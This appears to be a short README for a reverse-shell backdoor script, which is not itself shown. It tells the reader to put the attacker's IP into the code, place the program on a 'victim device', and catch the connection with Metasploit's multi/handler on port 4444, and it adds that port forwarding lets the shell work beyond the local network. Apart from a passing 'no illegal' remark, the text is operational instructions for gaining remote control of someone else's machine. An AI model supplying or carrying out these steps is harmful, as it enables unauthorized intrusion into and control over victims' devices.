Remember to import all modules and change the attacking machines ip in the code before putting it on the victim device.

also no illegal shit
also forgot to mention you can connect using meterpreter run the following commands once you opened it in kali:

use exploit/multi/handler

set lhost (your attacking devices local ip goes here, without any brackets)

set lport 4444

run


also this only runs on local networks, though it can be done through different networks if you make uses of things such as port fowarding
